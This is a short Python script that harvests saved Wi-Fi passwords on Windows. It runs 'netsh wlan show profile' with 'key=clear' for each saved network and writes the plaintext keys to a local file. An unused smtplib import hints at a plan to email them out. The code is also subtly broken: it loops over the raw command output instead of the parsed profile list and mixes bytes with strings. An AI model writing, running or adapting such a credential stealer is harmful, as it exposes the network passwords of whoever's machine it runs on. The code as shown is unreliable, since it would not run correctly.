#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Wed Oct  5 17:00:22 2022

@author: yabsera
"""

import subprocess,smtplib,re
command="netsh wlan show profile"
networks=subprocess.check_output(command,shell=True)
network_list=re.findall('(?:Profile\s*:\s)(.*)',networks)

final=""

for network in networks:
  say="netsh wlan show profile "+network+" key=clear"
  take=subprocess.check_output(say,shell=True)
  final+=take
wifi_password=open("wifipass.txt","w")
wifi_password.writelines(final)
wifi_password.close()
